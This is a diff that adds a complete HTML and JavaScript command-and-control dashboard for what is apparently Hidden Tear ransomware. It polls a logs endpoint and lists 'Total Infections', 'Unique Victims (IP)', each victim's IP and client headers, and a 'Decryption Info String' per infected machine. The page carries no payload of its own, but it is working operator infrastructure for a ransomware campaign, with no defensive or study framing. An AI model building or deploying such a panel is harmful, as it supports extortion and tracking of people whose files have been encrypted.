@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Dashboard | Hidden Tear</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-body: #09090b;
+            --bg-card: #18181b;
+            --bg-card-hover: #27272a;
+            --border: #27272a;
+            --accent: #3b82f6; /* Blue */
+            --accent-glow: rgba(59, 130, 246, 0.15);
+            --text-main: #e4e4e7;
+            --text-muted: #a1a1aa;
+            --success: #10b981;
+            --danger: #ef4444;
+            --font-ui: 'Inter', sans-serif;
+            --font-code: 'JetBrains Mono', monospace;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            font-family: var(--font-ui);
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+
+        /* Layout */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 1rem;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            color: var(--success);
+            background: rgba(16, 185, 129, 0.1);
+            padding: 4px 12px;
+            border-radius: 99px;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2.5rem;
+        }
+
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            padding: 1.5rem;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            font-family: var(--font-code);
+            color: var(--text-main);
+        }
+
+        /* Controls */
+        .controls {
+            margin-bottom: 1.5rem;
+            display: flex;
+            gap: 1rem;
+        }
+
+        .search-input {
+            width: 100%;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            font-family: var(--font-ui);
+            font-size: 0.95rem;
+            transition: border-color 0.2s;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        /* Logs List */
+        .logs-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .log-entry {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .log-entry:hover {
+            transform: translateY(-2px);
+            border-color: #3f3f46;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+        }
+
+        .log-header {
+            padding: 1rem;
+            display: grid;
+            grid-template-columns: 80px 140px 1fr 180px 40px; /* ID | IP | Info | Time | Chevron */
+            align-items: center;
+            gap: 1rem;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        @media (max-width: 768px) {
+            .log-header {
+                grid-template-columns: 1fr auto; 
+                grid-template-areas: 
+                    "id time"
+                    "info info";
+                gap: 0.5rem;
+            }
+            .col-ip { display: none; } /* Hide IP on mobile summary for space */
+            .col-chevron { display: none; }
+            .col-id { grid-area: id; }
+            .col-time { grid-area: time; text-align: right; }
+            .col-info { grid-area: info; }
+        }
+
+        .col-id {
+            font-family: var(--font-code);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .col-ip {
+            font-family: var(--font-code);
+            color: var(--accent);
+            background: rgba(59, 130, 246, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+            text-align: center;
+        }
+
+        .col-info {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-weight: 500;
+        }
+
+        .col-time {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            text-align: right;
+        }
+
+        .log-details {
+            height: 0; /* Animated height */
+            overflow: hidden;
+            background: #111113;
+            border-top: 1px solid var(--border);
+            transition: height 0.3s ease;
+        }
+
+        .log-details-content {
+            padding: 1.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            font-family: var(--font-code);
+        }
+
+        .detail-row {
+            margin-bottom: 0.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .detail-label {
+            color: #71717a;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+        }
+
+        .detail-value {
+            color: #d4d4d8;
+            word-break: break-all;
+        }
+
+        /* Utils */
+        .icon {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 2;
+            fill: none;
+        }
+        .chevron {
+            transition: transform 0.3s;
+        }
+        .expanded .chevron {
+            transform: rotate(180deg);
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 4rem;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>
+                <svg class="icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+                Encryption Dashboard
+            </h1>
+            <div class="live-indicator">
+                <div class="pulse-dot"></div>
+                LIVE
+            </div>
+        </header>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <span class="stat-label">Total Infections</span>
+                <span class="stat-value" id="stat-total">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Unique Victims (IP)</span>
+                <span class="stat-value" id="stat-unique">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Last Activity</span>
+                <span class="stat-value" id="stat-last" style="font-size: 1.2rem; margin-top: auto;">-</span>
+            </div>
+        </div>
+
+        <!-- Search -->
+        <div class="controls">
+            <input type="text" class="search-input" id="search-input" placeholder="Search IP, Info, ID..." oninput="handleSearch()">
+        </div>
+
+        <!-- List -->
+        <div id="logs-list" class="logs-list">
+            <div class="loading">Connecting to C2 server...</div>
+        </div>
+    </div>
+
+    <script>
+        let allLogs = [];
+        let lastSignature = "";
+        let isFirstLoad = true;
+
+        async function fetchLogs() {
+            try {
+                const response = await fetch('logs');
+                if (!response.ok) return; // Silent fail on network error, keep old data
+                const logs = await response.json();
+                
+                processLogs(logs);
+            } catch (error) {
+                console.error("Fetch error", error);
+            }
+        }
+
+        function processLogs(logs) {
+            // Check for updates
+            const signature = JSON.stringify(logs.map(l => l.id));
+            if (signature === lastSignature) return;
+            lastSignature = signature;
+            
+            allLogs = logs;
+            updateStats(logs);
+            renderList(logs, document.getElementById('search-input').value);
+        }
+
+        function updateStats(logs) {
+            document.getElementById('stat-total').innerText = logs.length;
+            
+            const uniqueIps = new Set(logs.map(l => l.ip)).size;
+            document.getElementById('stat-unique').innerText = uniqueIps;
+
+            if (logs.length > 0) {
+                // Determine most recent time
+                // The logs come sorted DESC by default from backend SQL, so index 0 is newest
+                const lastTime = new Date(logs[0].timestamp.replace(' ', 'T') + 'Z');
+                
+                // Format nicely: "Today at 10:42" or "2 days ago"
+                const formatter = new Intl.RelativeTimeFormat('en', { numeric: 'auto' });
+                const diffSeconds = (lastTime - new Date()) / 1000;
+                
+                // Simple relative display logic
+                let timeDisplay = lastTime.toLocaleTimeString();
+                if (Math.abs(diffSeconds) < 60) timeDisplay = "Just now";
+                else if (Math.abs(diffSeconds) < 3600) timeDisplay = Math.floor(Math.abs(diffSeconds)/60) + "m ago";
+                
+                document.getElementById('stat-last').innerText = timeDisplay;
+            }
+        }
+
+        function handleSearch() {
+            const query = document.getElementById('search-input').value;
+            renderList(allLogs, query);
+        }
+
+        function renderList(logs, query) {
+            const container = document.getElementById('logs-list');
+            
+            // Filter
+            const filtered = logs.filter(log => {
+                if (!query) return true;
+                const searchStr = (log.id + log.ip + log.info).toLowerCase();
+                return searchStr.includes(query.toLowerCase());
+            });
+
+            if (filtered.length === 0) {
+                container.innerHTML = '<div class="loading">No matching records found.</div>';
+                return;
+            }
+
+            container.innerHTML = filtered.map(log => {
+                const date = new Date(log.timestamp.replace(' ', 'T') + 'Z');
+                return `
+                <div class="log-entry" onclick="toggleLog(this)">
+                    <div class="log-header">
+                        <div class="col-id">#${log.id}</div>
+                        <div class="col-ip">${log.ip}</div>
+                        <div class="col-info" title="${escapeHtml(log.info)}">${escapeHtml(log.info)}</div>
+                        <div class="col-time">${date.toLocaleTimeString()}</div>
+                        <div class="col-chevron">
+                            <svg class="chevron icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M6 9l6 6 6-6"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="log-details">
+                        <div class="log-details-content">
+                            <div class="detail-row">
+                                <span class="detail-label">Full Timestamp</span>
+                                <span class="detail-value">${date.toLocaleString()}</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="detail-label">Client Headers</span>
+                                <span class="detail-value" style="font-size:0.8rem">${escapeHtml(log.headers)}</span>
+                            </div>
+                             <div class="detail-row">
+                                <span class="detail-label">Decryption Info String</span>
+                                <span class="detail-value">${escapeHtml(log.info)}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `}).join('');
+        }
+
+        function toggleLog(element) {
+            // Find the details div
+            const details = element.querySelector('.log-details');
+            
+            if (element.classList.contains('expanded')) {
+                // Collapse
+                details.style.height = '0px';
+                element.classList.remove('expanded');
+            } else {
+                // Expand (calculate actual height)
+                // We need to temporarily unset height to get scrollHeight, 
+                // but since it's 0 currently, scrollHeight works fine.
+                const height = details.scrollHeight;
+                details.style.height = height + 'px';
+                element.classList.add('expanded');
+            }
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        // Init
+        fetchLogs();
+        setInterval(fetchLogs, 5000); // 5s faster polling for snappy feel
+    </script>
+</body>
+</html>
